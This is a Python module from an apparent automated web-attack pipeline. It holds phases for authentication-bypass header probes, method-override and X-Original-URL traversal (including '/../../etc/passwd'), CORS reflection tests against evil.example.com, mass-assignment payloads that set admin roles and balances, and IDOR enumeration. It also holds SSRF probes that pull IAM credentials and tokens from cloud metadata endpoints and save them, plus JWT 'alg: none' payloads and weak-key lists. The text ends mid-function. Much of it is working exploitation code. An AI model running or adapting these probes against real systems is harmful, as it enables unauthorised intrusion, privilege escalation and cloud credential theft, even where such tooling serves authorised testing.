"""Authentication and session management phases."""

import asyncio
import base64
import json
import math
import re
import shlex
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple

from vulnforge.phases.helpers import PhaseSet
from vulnforge.process import (
    _PIPELINE_CFG,
    _run,
)
from vulnforge.tools import Tools
from vulnforge.utils import (
    _async_urlopen,
    _async_urlopen_no_redirect,
    _dedupe_by_host_path,
    _extra_headers_dict,
    _extract_host,
    _get_urlopener,
    _load_live_hosts,
    _safe_name,
    _throttle_rate,
    count_nonblank,
    ensure,
    log,
    parse_set_cookie_headers,
    read_lines,
)

_AUTH_BYPASS_HEADERS = [
    "X-Original-URL",
    "X-Rewrite-URL",
    "X-Forwarded-For",
    "X-Forwarded-Host",
    "X-Host",
    "X-Forwarded-Scheme",
    "X-Real-IP",
    "Client-IP",
    "X-Custom-IP-Authorization",
    "X-Auth-Token",
    "X-Auth-User",
    "Authorization: Basic YWRtaW46YWRtaW4=",
]
_AUTH_METHOD_OVERRIDE_HEADERS = [
    "X-HTTP-Method-Override",
    "X-HTTP-Method",
    "X-Method-Override",
    "X-HTTP-Method-Override: POST",
    "X-HTTP-Method-Override: PUT",
    "X-HTTP-Method-Override: PATCH",
    "X-HTTP-Method-Override: DELETE",
]
_MASS_ASSIGN_FIELDS = [
    "admin",
    "is_admin",
    "role",
    "roles",
    "permissions",
    "is_teacher",
    "is_student",
    "group",
    "user_type",
    "balance",
    "points",
    "score",
    "grade",
    "completed",
    "approved",
    "verified",
    "active",
    "enabled",
    "plan",
    "tier",
    "subscription",
]


async def phase_16a_AUTHZ(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False
) -> Dict[str, Any]:
    if skip & {"16a-AUTHZ"}:
        return {}
    _l_out = outdir / "authz_bypass.txt"
    if _l_out.exists() and not force:
        return {"16a-AUTHZ": str(_l_out), "count": count_nonblank(_l_out)}
    log("INFO", "Phase 16a-AUTHZ: auth bypass headers + method override + CORS checks")
    findings: List[str] = []
    _l_urlopen = _get_urlopener()
    # 1. Collect API-like endpoints from urls_all.txt + ffuf output
    urls = outdir / "urls_all.txt"
    api_endpoints: Set[str] = set()
    if urls.exists():
        for u in _dedupe_by_host_path(read_lines(urls)):
            path = u.split("?")[0].split("#")[0].lower()
            if "/api/" in path or path.endswith(
                (
                    "/api",
                    "/account",
                    "/login",
                    "/register",
                    "/password",
                    "/user",
                    "/admin",
                    "/graphql",
                )
            ):
                api_endpoints.add(u)
    # Also check ffuf output for 200/301/302/403 endpoints
    for ff in outdir.glob("ffuf_*.txt"):
        if ff.exists() and ff.name != "fuzz.txt":
            for ln in read_lines(ff):
                parts = ln.split("\t", 1)
                if len(parts) == 2:
                    api_endpoints.add(parts[1])
    if not api_endpoints:
        # Fall back to first 10 urls
        api_endpoints = (
            set(read_lines(urls)[: _PIPELINE_CFG.sample_endpoints_l]) if urls.exists() else set()
        )
    if not api_endpoints:
        log("WARNING", "16a-AUTHZ: no endpoints found; skipping")
        return {"16a-AUTHZ": str(outdir / "authz_bypass.txt"), "count": 0}
    findings.append(f"target_endpoints={len(api_endpoints)}")
    for ep in sorted(api_endpoints)[: _PIPELINE_CFG.sample_endpoints_l]:
        findings.append(f"  endpoint={ep}")
    # 2. qsreplace parameter pollution testing
    if t.has("qsreplace") and sorted(api_endpoints)[: _PIPELINE_CFG.sample_endpoints_l]:
        qsreplace_in = ensure(outdir / "urls_qsreplace.txt")
        qsreplace_in.write_text(
            "\n".join(sorted(api_endpoints)[: _PIPELINE_CFG.sample_endpoints_l]) + "\n"
        )
        qsreplace_out = outdir / "qsreplace_results.txt"
        runner = outdir / "logs" / "qsreplace_runner.sh"
        ensure(runner)
        runner.write_text(
            "#!/usr/bin/env bash\n"
            "set -eu\n"
            f"IN={shlex.quote(str(qsreplace_in))}\n"
            f"OUT={shlex.quote(str(qsreplace_out))}\n"
            'cat "$IN" | qsreplace "evil" > "$OUT"\n'
        )
        runner.chmod(0o700)
        await _run(
            "qsreplace",
            ["bash", str(runner)],
            300,
            outdir,
        )
        if qsreplace_out.exists() and read_lines(qsreplace_out):
            for ln in read_lines(qsreplace_out)[:20]:
                findings.append(f"  [qsreplace] {ln}")
    # 3. Auth bypass header probes (non-destructive, concurrent)
    bypass_found: List[str] = []
    targets = sorted(api_endpoints)[: _PIPELINE_CFG.sample_endpoints_l]

    async def _check_bypass(ep: str) -> List[str]:
        results: List[str] = []
        try:
            base_req = urllib.request.Request(ep, method="GET")
            baseline_status, _, baseline_body = await _async_urlopen(
                _l_urlopen, base_req, timeout=8
            )
            baseline_len = len(baseline_body)
        except asyncio.CancelledError:
            raise
        except Exception:
            return results
        for hdr in _AUTH_BYPASS_HEADERS:
            await _throttle_rate()
            try:
                req = urllib.request.Request(ep, method="GET")
                if ":" in hdr:
                    k, v = hdr.split(":", 1)
                    req.add_header(k.strip(), v.strip())
                elif hdr in ("X-Original-URL", "X-Rewrite-URL"):
                    req.add_header(hdr, "/admin")
                elif hdr in ("X-Auth-Token", "X-Auth-User"):
                    req.add_header(hdr, "admin")
                elif hdr == "X-Custom-IP-Authorization":
                    req.add_header(hdr, "127.0.0.1")
                elif hdr == "Authorization: Basic YWRtaW46YWRtaW4=":
                    req.add_header("Authorization", "Basic YWRtaW46YWRtaW4=")
                else:
                    req.add_header(hdr, "127.0.0.1")
                probe_status, _, probe_body = await _async_urlopen(_l_urlopen, req, timeout=8)
                probe_len = len(probe_body)
                # Only a 200/302 probe against a protected baseline indicates a bypass.
                if probe_status in (200, 302) and baseline_status in (401, 403):
                    results.append(
                        f"  bypass={hdr} → {probe_status} (baseline={baseline_status}) on {ep}"
                    )
                    break
                # A 401/403 where the baseline was public is a block, not a bypass.
                if probe_status in (401, 403) and baseline_status == 200:
                    results.append(
                        f"  block={hdr} → {probe_status} (baseline={baseline_status}) on {ep}"
                    )
                    break
                # Same status code but significantly different body length → may indicate
                # different content being served (e.g. admin panel vs login page)
                if (
                    probe_status == baseline_status
                    and probe_len
                    and abs(probe_len - baseline_len) > max(100, baseline_len * 0.1)
                ):
                    results.append(
                        f"  bypass_body_diff={hdr} (status={probe_status}, len={probe_len}, baseline_len={baseline_len}) on {ep}"
                    )
            except asyncio.CancelledError:
                raise
            except Exception:
                continue
        return results

    bypass_results = await asyncio.gather(*[_check_bypass(ep) for ep in targets])
    for br in bypass_results:
        bypass_found.extend(br)

    # 3a. HTTP method override probes (concurrent)
    method_override_findings: List[str] = []

    async def _check_method_override(ep: str) -> List[str]:
        results: List[str] = []
        for ohdr in _AUTH_METHOD_OVERRIDE_HEADERS:
            await _throttle_rate()
            try:
                req = urllib.request.Request(
                    ep,
                    method="GET",
                    headers={
                        "User-Agent": "Mozilla/5.0",
                        "Content-Type": "application/x-www-form-urlencoded",
                    },
                )
                if ":" in ohdr:
                    k, v = ohdr.split(":", 1)
                    req.add_header(k.strip(), v.strip())
                else:
                    req.add_header(ohdr, "POST")
                override_status, _, _ = await _async_urlopen(_l_urlopen, req, timeout=8)
                if override_status in (200, 201, 302, 403, 405, 500):
                    results.append(f"  method_override={ohdr} → {override_status} on {ep}")
            except asyncio.CancelledError:
                raise
            except Exception:
                continue
        return results

    mo_results = await asyncio.gather(*[_check_method_override(ep) for ep in targets])
    for mr in mo_results:
        method_override_findings.extend(mr)

    # 3b. X-Original-URL path traversal probes
    xou_findings: List[str] = []

    async def _check_xou_traversal(ep: str) -> List[str]:
        results: List[str] = []
        for path in ["/admin", "/../admin", "/%2e%2e/admin", "/..;/admin", "/../../etc/passwd"]:
            await _throttle_rate()
            try:
                req = urllib.request.Request(
                    ep, method="GET", headers={"User-Agent": "Mozilla/5.0", "X-Original-URL": path}
                )
                xou_status, _, xou_body = await _async_urlopen(_l_urlopen, req, timeout=8)
                if xou_status in (200, 201, 302, 403):
                    results.append(f"  xou_traversal=X-Original-URL: {path} → {xou_status} on {ep}")
            except asyncio.CancelledError:
                raise
            except Exception:
                continue
        return results

    xou_results = await asyncio.gather(*[_check_xou_traversal(ep) for ep in targets])
    for xr in xou_results:
        xou_findings.extend(xr)

    findings.append("auth_bypass_probes:")
    findings.extend(bypass_found or ["  none detected (expected)"])
    if method_override_findings:
        findings.append("method_override_probes:")
        findings.extend(method_override_findings)
    if xou_findings:
        findings.append("xou_traversal_probes:")
        findings.extend(xou_findings)
    # 4. Basic CORS misconfiguration check (origin reflection)
    cors_findings: List[str] = []

    async def _check_cors(ep: str) -> Optional[str]:
        try:
            req = urllib.request.Request(ep, method="GET")
            req.add_header("Origin", "https://evil.example.com")
            _, cors_headers, _ = await _async_urlopen(_l_urlopen, req, timeout=8)
            acao = cors_headers.get("Access-Control-Allow-Origin", "")
            acac = cors_headers.get("Access-Control-Allow-Credentials", "")
            if "*" in acao or "evil.example.com" in acao:
                return f"  cors_origin_reflection=YES (ACAO={acao}, ACAC={acac}) on {ep}"
        except asyncio.CancelledError:
            raise
        except Exception:
            pass
        return None

    cors_results = await asyncio.gather(
        *[_check_cors(ep) for ep in targets[: _PIPELINE_CFG.sample_endpoints_cors]]
    )
    for r in cors_results:
        if r:
            cors_findings.append(r)
    if cors_findings:
        findings.append("cors_checks:")
        findings.extend(cors_findings)
    out = ensure(outdir / "authz_bypass.txt")
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("OK", f"16a-AUTHZ: {len(findings)} auth bypass findings → {out}")
    return {"16a-AUTHZ": str(out), "count": len(findings)}


async def phase_16b_MASSASSIGN(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"16b-MASSASSIGN"}:
        return {}
    _out = outdir / "mass_assign.txt"
    if _out.exists() and not force:
        return {"16b-MASSASSIGN": str(_out), "count": count_nonblank(_out)}
    log("INFO", "Phase 16b-MASSASSIGN: mass assignment probes via POST/PUT")
    findings: List[str] = []
    _ma_urlopen = _get_urlopener()
    urls = outdir / "urls_all.txt"
    api_endpoints: Set[str] = set()
    if urls.exists():
        for u in _dedupe_by_host_path(read_lines(urls)):
            path = u.split("?")[0].split("#")[0].lower()
            if "/api/" in path or path.endswith(
                (
                    "/api",
                    "/account",
                    "/login",
                    "/register",
                    "/password",
                    "/user",
                    "/admin",
                    "/graphql",
                )
            ):
                api_endpoints.add(u)
    for ff in outdir.glob("ffuf_*.txt"):
        if ff.exists() and ff.name != "fuzz.txt":
            for ln in read_lines(ff):
                parts = ln.split("\t", 1)
                if len(parts) == 2:
                    api_endpoints.add(parts[1])
    if not api_endpoints:
        api_endpoints = (
            set(read_lines(urls)[: _PIPELINE_CFG.sample_endpoints_l]) if urls.exists() else set()
        )
    if not api_endpoints:
        log("WARNING", "16b-MASSASSIGN: no endpoints found; skipping")
        return {"16b-MASSASSIGN": str(_out), "count": 0}
    findings.append(f"target_endpoints={len(api_endpoints)}")
    _MASS_ASSIGN_VALUES: Dict[str, object] = {
        "admin": True,
        "is_admin": True,
        "role": "admin",
        "roles": ["admin"],
        "permissions": ["admin"],
        "is_teacher": True,
        "is_student": True,
        "group": "admin",
        "user_type": "admin",
        "plan": "enterprise",
        "tier": "premium",
        "subscription": "premium",
        "balance": 999999,
        "points": 999999,
        "score": 999999,
        "grade": "A+",
        "completed": True,
        "approved": True,
        "verified": True,
        "active": True,
        "enabled": True,
    }
    post_targets = [
        ep
        for ep in sorted(api_endpoints)[: _PIPELINE_CFG.sample_endpoints_post]
        if "?" not in ep.split("#")[0]
    ]

    async def _check_mass_assignment(ep: str) -> List[str]:
        results: List[str] = []
        control_status: Optional[int] = None
        control_len = 0
        try:
            ctrl_req = urllib.request.Request(
                ep,
                data=json.dumps({"__vf_control_field__": True}).encode(),
                method="POST",
                headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            )
            control_status, _, ctrl_body = await _async_urlopen(_ma_urlopen, ctrl_req, timeout=8)
            control_len = len(ctrl_body)
        except asyncio.CancelledError:
            raise
        except Exception:
            control_status = None
        for field in _MASS_ASSIGN_FIELDS[: _PIPELINE_CFG.sample_endpoints_post]:
            await _throttle_rate()
            val = _MASS_ASSIGN_VALUES.get(field, True)
            body = json.dumps({field: val}).encode()
            try:
                req = urllib.request.Request(
                    ep,
                    data=body,
                    method="POST",
                    headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
                )
                post_status, _, post_body = await _async_urlopen(_ma_urlopen, req, timeout=8)
                if post_status in (200, 201, 302) and control_status is not None:
                    if post_status == control_status and abs(len(post_body) - control_len) <= max(
                        50, control_len * 0.1
                    ):
                        continue
                    body_text = post_body.decode("utf-8", errors="ignore").lower()
                    applied = f'"{field}"' in body_text and any(
                        m in body_text
                        for m in (
                            "admin",
                            "premium",
                            "enterprise",
                            "true",
                            "approved",
                            "verified",
                            "enabled",
                            "active",
                            "completed",
                        )
                    )
                    tag = "[mass-assign]" if applied else "[mass-assign-candidate]"
                    results.append(
                        f"  {tag} POST {ep} {{{field}: {json.dumps(val)}}} → {post_status} (control={control_status})"
                    )
            except asyncio.CancelledError:
                raise
            except Exception:
                continue
        return results

    async def _check_mass_assignment_put(ep: str) -> List[str]:
        results: List[str] = []
        control_status: Optional[int] = None
        control_len = 0
        try:
            ctrl_req = urllib.request.Request(
                ep,
                data=json.dumps({"__vf_control_field__": True}).encode(),
                method="PUT",
                headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            )
            control_status, _, ctrl_body = await _async_urlopen(_ma_urlopen, ctrl_req, timeout=8)
            control_len = len(ctrl_body)
        except asyncio.CancelledError:
            raise
        except Exception:
            control_status = None
        for field in _MASS_ASSIGN_FIELDS[: _PIPELINE_CFG.sample_endpoints_post]:
            await _throttle_rate()
            val = _MASS_ASSIGN_VALUES.get(field, True)
            body = json.dumps({field: val}).encode()
            try:
                req = urllib.request.Request(
                    ep,
                    data=body,
                    method="PUT",
                    headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
                )
                put_status, _, put_body = await _async_urlopen(_ma_urlopen, req, timeout=8)
                if put_status in (200, 201, 302) and control_status is not None:
                    if put_status == control_status and abs(len(put_body) - control_len) <= max(
                        50, control_len * 0.1
                    ):
                        continue
                    body_text = put_body.decode("utf-8", errors="ignore").lower()
                    applied = f'"{field}"' in body_text and any(
                        m in body_text
                        for m in (
                            "admin",
                            "premium",
                            "enterprise",
                            "true",
                            "approved",
                            "verified",
                            "enabled",
                            "active",
                            "completed",
                        )
                    )
                    tag = "[mass-assign]" if applied else "[mass-assign-candidate]"
                    results.append(
                        f"  {tag} PUT {ep} {{{field}: {json.dumps(val)}}} → {put_status} (control={control_status})"
                    )
            except asyncio.CancelledError:
                raise
            except Exception:
                continue
        return results

    post_results = await asyncio.gather(*[_check_mass_assignment(ep) for ep in post_targets])
    for pr in post_results:
        findings.extend(pr)
    put_results = await asyncio.gather(*[_check_mass_assignment_put(ep) for ep in post_targets])
    for pr in put_results:
        findings.extend(pr)
    if not findings or len(findings) == 1:
        findings.append("[result] No mass assignment vulnerabilities detected")
    findings.append("mass_assignment_fields_tested:")
    findings.extend([f"  {f}" for f in _MASS_ASSIGN_FIELDS])
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("OK", f"16b-MASSASSIGN: {len(findings)} findings → {out}")
    return {"16b-MASSASSIGN": str(_out), "count": len(findings)}


async def phase_17_IDOR(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"17-IDOR"}:
        return {}
    _out = outdir / "idor.txt"
    if _out.exists() and not force:
        return {"17-IDOR": str(_out), "count": count_nonblank(_out)}
    log("INFO", "Phase 17-IDOR: systematic ID manipulation testing")
    findings: List[str] = []
    _id_urlopen = _get_urlopener()
    _id_extra_headers = _extra_headers_dict()
    urls_file = outdir / "urls_all.txt"
    params_file = outdir / "params.txt"
    all_urls: List[str] = []
    if urls_file.exists():
        all_urls = read_lines(urls_file)
    if params_file.exists():
        all_urls.extend(read_lines(params_file))
    all_urls = _dedupe_by_host_path(all_urls)
    if not all_urls:
        log("WARNING", "17-IDOR: no URLs or params available; skipping")
        return {"17-IDOR": str(_out), "count": 0}
    # Identify ID-bearing parameters
    id_params = [
        "id",
        "user_id",
        "account_id",
        "customer_id",
        "profile_id",
        "uid",
        "uuid",
        "guid",
        "token",
        "reference",
        "order_id",
        "transaction_id",
        "invoice_id",
        "document_id",
        "file_id",
        "app_id",
        "org_id",
        "group_id",
        "role_id",
        "permission_id",
    ]
    id_urls = [u for u in all_urls if any(p + "=" in u.lower() for p in id_params)][
        : _PIPELINE_CFG.sample_urls_idor
    ]
    if not id_urls:
        # Fall back to any param-bearing URLs
        id_urls = [u for u in all_urls if "=" in u][: _PIPELINE_CFG.sample_urls_idor]
    if not id_urls:
        log("WARNING", "17-IDOR: no parameter-bearing URLs; skipping")
        return {"17-IDOR": str(_out), "count": 0}
    findings.append(f"target_urls={len(id_urls)}")
    # Helper to switch UUIDs between test accounts
    known_uuids = [
        "00000000-0000-0000-0000-000000000000",
        "11111111-1111-1111-1111-111111111111",
        "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa",
    ]

    async def _probe_idor(url: str) -> List[str]:
        results: List[str] = []
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            return results
        # Baseline request
        try:
            base_req = urllib.request.Request(
                url, headers={"User-Agent": "Mozilla/5.0", **_id_extra_headers}
            )
            base_status, _, base_body = await _async_urlopen(_id_urlopen, base_req, timeout=10)
            base_len = len(base_body)
        except asyncio.CancelledError:
            raise
        except Exception:
            return results
        for pname in qs:
            if not any(
                idp in pname.lower()
                for idp in ["id", "uid", "uuid", "account", "user", "customer", "profile"]
            ):
                continue
            orig_val = qs[pname][0]
            mutations: List[str] = []
            # Numeric increment/decrement
            if orig_val.isdigit():
                mutations.append(str(int(orig_val) + 1))
                mutations.append(str(max(0, int(orig_val) - 1)))
                mutations.append("1")
                mutations.append("999999")
            elif len(orig_val) == 36 and orig_val.count("-") == 4:
                # Looks like a UUID: try known UUIDs
                mutations.extend(known_uuids)
                # Try swapping first group
                parts = orig_val.split("-")
                if len(parts) == 5:
                    mutations.append("-".join(["00000000"] + parts[1:]))
                    mutations.append("-".join(["11111111"] + parts[1:]))
            # Sequential/predictable mutations
            mutations.append("0")
            mutations.append("1")
            mutations.append("-1")
            # Deduplicate to avoid sending the same mutation twice
            mutations = list(dict.fromkeys(mutations))
            for mutation in mutations[: _PIPELINE_CFG.sample_endpoints_post]:
                await _throttle_rate()
                test_qs = qs.copy()
                test_qs[pname] = [mutation]
                new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                try:
                    req = urllib.request.Request(
                        test_url, headers={"User-Agent": "Mozilla/5.0", **_id_extra_headers}
                    )
                    test_status, _, test_body = await _async_urlopen(_id_urlopen, req, timeout=10)
                    test_len = len(test_body)
                    # IDOR indicators: same status as baseline but different content,
                    # or status 200 when baseline was 403/401 (unauthorized access)
                    if test_status == 200 and base_status in (401, 403):
                        results.append(
                            f"[idor] {test_url} → HTTP {test_status} (baseline={base_status}) — privilege escalation"
                        )
                    elif (
                        test_status == base_status
                        and test_len > 0
                        and base_len > 0
                        and abs(test_len - base_len) > max(200, base_len * 0.2)
                    ):
                        results.append(
                            f"[idor-candidate] {test_url} → HTTP {test_status} len={test_len} (baseline={base_status}/{base_len})"
                        )
                except asyncio.CancelledError:
                    raise
                except Exception:
                    continue
        return results

    probe_results = await asyncio.gather(*[_probe_idor(u) for u in id_urls])
    for pr in probe_results:
        findings.extend(pr)

    # UUID v1 timestamp extraction
    uuid_v1_findings: List[str] = []
    for u in id_urls:
        for token in u.split("=")[1].split("&"):
            token_clean = token.split("%")[0].strip()
            if len(token_clean) == 36 and token_clean.count("-") == 4:
                try:
                    import uuid as _uuid

                    uobj = _uuid.UUID(token_clean)
                    if uobj.version == 1:
                        ts = (uobj.time - 0x01B21DD213814000) / 10000000
                        from datetime import datetime as _dt

                        ts_str = _dt.utcfromtimestamp(ts).isoformat()
                        uuid_v1_findings.append(
                            f"[uuid-v1] {u} — UUID v1 detected: {token_clean} timestamp={ts_str}"
                        )
                except asyncio.CancelledError:
                    raise
                except Exception:
                    continue
    findings.extend(uuid_v1_findings)

    # Hash-based ID detection
    hash_id_findings: List[str] = []
    id_hash_patterns = [
        (r"^[A-Za-z0-9_-]{20,}={0,2}$", "base64url-like"),
        (r"^[0-9a-f]{32}$", "MD5-like (32 hex)"),
        (r"^[0-9a-f]{40}$", "SHA1-like (40 hex)"),
        (r"^[0-9a-f]{64}$", "SHA256-like (64 hex)"),
        (r"^\d{8,}$", "numeric-timestamp-like"),
    ]
    for u in id_urls:
        for token in u.split("=")[1].split("&"):
            clean = token.split("&")[0].strip().rstrip("/")
            for pattern, desc in id_hash_patterns:
                if re.match(pattern, clean):
                    hash_id_findings.append(
                        f"[hash-id-candidate] {u} — ID looks like {desc}: {clean[:30]}"
                    )
                    break
    findings.extend(hash_id_findings[:10])

    # Time-based ID prediction note
    findings.append(
        "[idor-note] Time-based ID prediction: check if IDs are sequential timestamps by registering multiple accounts and comparing ID increments"
    )
    findings.append(
        "[idor-note] Incremental ID enumeration: use bulk enumeration with range 1-10000 on discovered ID endpoints"
    )

    # Incremental ID enumeration on first few targets
    enum_findings: List[str] = []
    for u in id_urls[:2]:
        parsed = urllib.parse.urlparse(u)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            continue
        for pname in qs:
            if not any(idp in pname.lower() for idp in ["id", "uid", "user", "account"]):
                continue
            found_first = None
            for candidate in range(1, 50):
                await _throttle_rate()
                test_qs = qs.copy()
                test_qs[pname] = [str(candidate)]
                new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                try:
                    req = urllib.request.Request(
                        test_url, headers={"User-Agent": "Mozilla/5.0", **_id_extra_headers}
                    )
                    es, _, eb = await _async_urlopen(_id_urlopen, req, timeout=8)
                    if es == 200 and len(eb) > 100:
                        if found_first is None:
                            found_first = candidate
                        elif candidate - found_first > 1:
                            enum_findings.append(
                                f"[idor-enum] {test_url} — HTTP {es} len={len(eb)} (sequential enumeration found IDs {found_first}-{candidate})"
                            )
                            break
                except asyncio.CancelledError:
                    raise
                except Exception:
                    continue
            if enum_findings:
                break
    findings.extend(enum_findings)

    if not findings:
        findings.append("[result] No IDOR vulnerabilities detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("OK", f"17-IDOR: {len(findings)} findings → {out}")
    return {"17-IDOR": str(_out), "count": len(findings)}


_SSRF_META_MARKERS = [
    "ami-id",
    "instance-id",
    "instance-id-document",
    "security-credentials",
    "accesskeyid",
    "secretaccesskey",
    "accountid",
    "role/",
    "serviceaccount",
    "private_key",
    "client_id",
    "client_secret",
    "computeMetadata",
    "user-data",
    "userdata",
    "public-keys",
    "reservation-id",
    "access_token",
    "refresh_token",
    "token_uri",
]


async def phase_17b_SSRFMETA(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"17b-SSRFMETA"}:
        return {}
    _out = outdir / "ssrf_meta.txt"
    if _out.exists() and not force:
        return {"17b-SSRFMETA": str(_out), "count": count_nonblank(_out)}
    log("INFO", "Phase 17b-SSRFMETA: cloud metadata exfiltration via confirmed SSRF")
    findings: List[str] = []
    _ss_urlopen = _get_urlopener()
    _ss_extra_headers = _extra_headers_dict()
    # Read SSRF candidates from vulns.txt and url_ssrf.txt
    vulns_file = outdir / "vulns.txt"
    ssrf_urls_file = outdir / "urls_ssrf.txt"
    ssrf_candidates: List[str] = []
    if vulns_file.exists():
        for ln in read_lines(vulns_file):
            if "ssrf" in ln.lower():
                # Extract URL from line
                for token in ln.split():
                    if token.startswith("http"):
                        ssrf_candidates.append(token)
                        break
    if ssrf_urls_file.exists():
        ssrf_candidates.extend(read_lines(ssrf_urls_file))
    ssrf_candidates = _dedupe_by_host_path(ssrf_candidates)
    if not ssrf_candidates:
        log("WARNING", "17b-SSRFMETA: no SSRF candidates found; skipping")
        return {"17b-SSRFMETA": str(_out), "count": 0}
    findings.append(f"ssrf_candidates={len(ssrf_candidates)}")
    # Cloud metadata IPs and paths
    cloud_targets = [
        # AWS
        ("AWS", "http://169.254.169.254/latest/meta-data/"),
        ("AWS", "http://169.254.169.254/latest/user-data/"),
        ("AWS", "http://169.254.169.254/latest/credentials/"),
        ("AWS", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
        # GCP
        ("GCP", "http://169.254.169.254/computeMetadata/v1/"),
        ("GCP", "http://metadata.google.internal/computeMetadata/v1/"),
        (
            "GCP",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        ),
        # Azure
        ("Azure", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
        ("Azure", "http://100.100.100.200/metadata/instance?api-version=2021-02-01"),
        # Alibaba Cloud / others
        ("AliCloud", "http://100.100.100.200/latest/meta-data/"),
        ("DigitalOcean", "http://169.254.169.254/metadata/v1.json"),
    ]
    for cand in ssrf_candidates[: _PIPELINE_CFG.sample_urls_fuzz]:
        parsed = urllib.parse.urlparse(cand)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            continue
        for pname in qs:
            orig_val = qs[pname][0]
            # Only test parameters that look like URL/redirect parameters
            if not any(
                k in pname.lower()
                for k in (
                    "url",
                    "uri",
                    "path",
                    "dest",
                    "redirect",
                    "target",
                    "site",
                    "host",
                    "domain",
                    "load",
                    "fetch",
                    "proxy",
                    "image",
                    "img",
                )
            ):
                continue
            for cloud_name, meta_url in cloud_targets:
                await _throttle_rate()
                test_qs = qs.copy()
                test_qs[pname] = [meta_url]
                new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                try:
                    ctrl_qs = qs.copy()
                    ctrl_qs[pname] = [orig_val]
                    ctrl_qs_enc = urllib.parse.urlencode(ctrl_qs, doseq=True)
                    ctrl_url = urllib.parse.urlunparse(parsed._replace(query=ctrl_qs_enc))
                    ctrl_req = urllib.request.Request(
                        ctrl_url,
                        headers={"User-Agent": "Mozilla/5.0", **_ss_extra_headers},
                    )
                    ctrl_status, _, ctrl_body = await _async_urlopen(
                        _ss_urlopen, ctrl_req, timeout=15
                    )
                    ctrl_text = ctrl_body.decode("utf-8", errors="ignore")
                except asyncio.CancelledError:
                    raise
                except Exception:
                    ctrl_status = None
                    ctrl_text = ""
                try:
                    req = urllib.request.Request(
                        test_url, headers={"User-Agent": "Mozilla/5.0", **_ss_extra_headers}
                    )
                    meta_status, meta_headers, meta_body = await _async_urlopen(
                        _ss_urlopen, req, timeout=15
                    )
                    meta_text = meta_body.decode("utf-8", errors="ignore")
                    # Differential: probe must differ from the original-value control,
                    # otherwise a generic 200 shell is indistinguishable from metadata
                    # exfiltration (the main source of false positives here).
                    is_differential = (
                        ctrl_status is None or meta_status != ctrl_status or meta_text != ctrl_text
                    )
                    meta_markers = [m for m in _SSRF_META_MARKERS if m in meta_text.lower()]
                    # If we got data back that looks like cloud metadata
                    if meta_status == 200 and len(meta_text) > 20 and is_differential:
                        if meta_markers or any(
                            secret_pattern in meta_text.lower()
                            for secret_pattern in [
                                "accesskey",
                                "secretkey",
                                "private_key",
                                "token",
                            ]
                        ):
                            findings.append(f"[credential-exfil] {cloud_name} via {test_url}")
                            findings.append(
                                f"  status={meta_status} body_length={len(meta_text)} markers={','.join(meta_markers[:5])}"
                            )
                            # Extract sensitive patterns
                            for secret_pattern in [
                                "accesskey",
                                "secretkey",
                                "token",
                                "password",
                                "private_key",
                                "ssh",
                            ]:
                                for line in meta_text.splitlines():
                                    if secret_pattern in line.lower():
                                        findings.append(f"  [secret] {line[:200]}")
                            # Save full response for evidence
                            meta_out = ensure(
                                outdir
                                / "ssrf_meta_raw"
                                / f"{_safe_name(cloud_name)}_{_safe_name(pname)}.txt"
                            )
                            meta_out.write_text(meta_text)
                        elif len(meta_text) > 200:
                            findings.append(
                                f"[possible-ssrf-meta] {cloud_name} via {test_url} — HTTP {meta_status} len={len(meta_text)} differs from control (check manually)"
                            )
                except asyncio.CancelledError:
                    raise
                except Exception:
                    continue
    if not findings:
        findings.append("[result] No cloud metadata exfiltration achieved")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("OK", f"17b-SSRFMETA: {len(findings)} findings → {out}")
    return {"17b-SSRFMETA": str(_out), "count": len(findings)}


_JWT_NONE_PAYLOADS = [
    "eyJhbGciOiJub25lIn0",
    "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0",
]
_JWT_WEAK_KEYS = [
    "secret",
    "password",
    "12345",
    "key",
    "admin",
    "changeme",
    "secretkey",
    "jwt_secret",
]
_JWT_AUTH_MARKERS = [
    "welcome",
    "dashboard",
    "profile",
    "admin",
    "logout",
    "account",
]


async def _jwt_acceptance_verdict(
    urlopen: Any,
    url: str,
    base_headers: Dict[str, str],
    token: str,
    timeout: int = 10,
) -> Tuple[Optional[int], Optional[int], Optional[int], str, str, str]:
    try:
        base_req = urllib.request.Request(url, method="GET", headers=base_headers)
        bs, _, bb = await _async_urlopen(urlopen, base_req, timeout=timeout)
    except urllib.error.HTTPError as e:
        bs = e.code
        bb = e.read()
    except asyncio.CancelledError:
        raise
    except Exception:
        bs = None
        bb = b""
    try:
        garbage_req = urllib.request.Request(
            url,
